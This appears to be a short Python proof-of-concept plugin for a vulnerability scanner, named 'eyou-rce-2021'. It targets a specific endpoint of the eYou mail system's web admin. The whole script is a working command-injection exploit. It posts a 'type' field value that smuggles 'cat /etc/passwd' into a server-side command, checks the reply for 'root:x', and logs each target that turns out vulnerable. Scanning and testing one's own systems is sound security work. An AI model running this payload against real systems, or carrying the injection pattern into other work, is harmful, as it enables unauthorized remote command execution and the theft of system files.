#!/usr/bin/env python
# coding=utf-8
import requests
from report.report import save

pocname = "eyou-rce-2021"
headers = {'Content-Type': 'application/x-www-form-urlencoded','User_Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36'}

def verify(arg, **kwargs):
	exploit = "/webadm/?q=moni_detail.do&action=gragh"
	data = "type='|cat /etc/passwd||'"
	try:
		r = requests.post(url=arg+exploit,headers=headers,data=data,timeout=7)
		if "root:x" in r.text:
			save(arg,pocname,exploit)
			return {"url": arg, "poc-name":pocname, "exploit": exploit}
	except Exception as e:
		pass